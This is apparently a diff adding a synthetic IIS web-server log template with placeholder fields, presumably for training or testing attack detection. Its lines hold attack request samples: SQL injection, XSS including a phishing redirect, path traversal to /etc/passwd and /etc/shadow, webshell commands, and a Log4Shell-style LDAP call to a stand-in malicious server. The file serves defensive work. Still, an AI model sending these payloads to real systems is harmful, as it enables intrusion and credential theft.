@@ -1,0 +1,48 @@
+date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /admin/login.php - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php id=1+UNION+SELECT+null,version(),null-- - {s_port} - {c_ip} {user_agent} - 500 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /search.aspx query=&lt;script>alert('XSS')&lt;/script> - {s_port} - {c_ip} {user_agent} - 400 0 64 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /../../../../etc/passwd - {s_port} - {c_ip} {user_agent_scanner} - 403 14 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /backup/config.bak - {s_port} - {c_ip} {user_agent} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /shell.php cmd=ls+-la - {s_port} - {c_ip} {user_agent_hacker_tool} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} PUT /uploads/malware.exe - {s_port} - {c_ip} {user_agent} - 405 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /.git/config - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php id=../../../../win.ini - {s_port} - {c_ip} {user_agent} - 403 14 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /scripts/setup.php - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php id=' OR '1'='1 - {s_port} - {c_ip} {user_agent} - 500 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /page.php param=&lt;img src=x onerror=alert(1)> - {s_port} - {c_ip} {user_agent} - 400 0 64 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /../web.config - {s_port} - {c_ip} {user_agent_scanner} - 403 14 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /old/data.zip - {s_port} - {c_ip} {user_agent} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /exec.asp?cmd=net+user - {s_port} - {c_ip} {user_agent_hacker_tool} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} DELETE /resource/{id} - {s_port} - {c_ip} {user_agent} - 405 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /.env - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php path=file:///etc/shadow - {s_port} - {c_ip} {user_agent} - 403 14 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms} # Brute force indicator (repeated failures)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /wp-config.php - {s_port} - {c_ip} {user_agent_scanner} - 403 4 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php id=1; DROP TABLE users-- - {s_port} - {c_ip} {user_agent} - 500 0 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /page.php name=">&lt;iframe src=javascript:alert(2)>" - {s_port} - {c_ip} {user_agent} - 400 0 64 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /App_Data/database.mdb - {s_port} - {c_ip} {user_agent_scanner} - 403 4 0 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /admin/auth.php - {s_port} admin {c_ip} {user_agent} http://{referer_host}/admin/ 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Successful admin login (monitor)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /private/key.pem - {s_port} - {c_ip} {user_agent} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms}
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /remote_cmd.php?cmd=ping {dst_ip} - {s_port} - {c_ip} {user_agent_hacker_tool} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Command injection test
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} TRACE / - {s_port} - {c_ip} {user_agent} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # HTTP Trace method enabled (risky)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /server-status - {s_port} - {c_ip} {user_agent_scanner} - 403 4 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Apache server status leakage attempt
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php?page=ldap://{malicious_ldap_server}/obj - {s_port} - {c_ip} {user_agent} - 500 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Log4Shell attempt style (LDAP in query)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /owa/auth/logon.aspx - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms} # Probing for Exchange OWA
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /phpinfo.php - {s_port} - {c_ip} {user_agent_scanner} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms} # Info leakage attempt
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /data_export.php?format=csv - {s_port} {user} {c_ip} {user_agent} - 200 0 0 {large_sc_bytes} {cs_bytes} {time_taken_ms} # Large data download (potential exfil)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /upload.php - {s_port} - {c_ip} {user_agent} - 200 0 0 {sc_bytes} {large_cs_bytes} {time_taken_ms} # Large data upload
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /webshell.aspx - {s_port} - {c_ip} {user_agent_hacker_tool} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Accessing webshell
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} CONNECT {proxy_target_ip}:{proxy_target_port} - {s_port} - {c_ip} {user_agent} - 200 0 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Unexpected CONNECT method
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET / - {s_port} - {known_bot_ip} {user_agent_bot} - 403 18 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Known bad bot blocked
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /index.php select * from users; - {s_port} - {c_ip} {user_agent} - 400 0 64 {sc_bytes} {cs_bytes} {time_taken_ms} # SQLi in query string (no param)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /&lt;script>document.location='http://{phishingsite}';&lt;/script> - {s_port} - {c_ip} {user_agent} - 400 0 64 {sc_bytes} {cs_bytes} {time_taken_ms} # XSS in URI stem
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /..%252F..%252Fwinnt/system32/cmd.exe?/c+dir - {s_port} - {c_ip} {user_agent_scanner} - 403 14 0 {sc_bytes} {cs_bytes} {time_taken_ms} # Directory traversal (encoded)
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} POST /login.aspx - {s_port} {user} {c_ip} {user_agent_scanner} http://{referer_host}/login.aspx 401 2 5 {sc_bytes} {cs_bytes} {time_taken_ms} # Scanner failing login
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /conf/server.xml - {s_port} - {c_ip} {user_agent} - 404 0 2 {sc_bytes} {cs_bytes} {time_taken_ms} # Tomcat config file probe
+{timestamp_w3c_date} {timestamp_w3c_time} {s_ip} GET /ws/management/server/management.php - {s_port} - {c_ip} {user_agent_hacker_tool} - 401 1 21 {sc_bytes} {cs_bytes} {time_taken_ms}
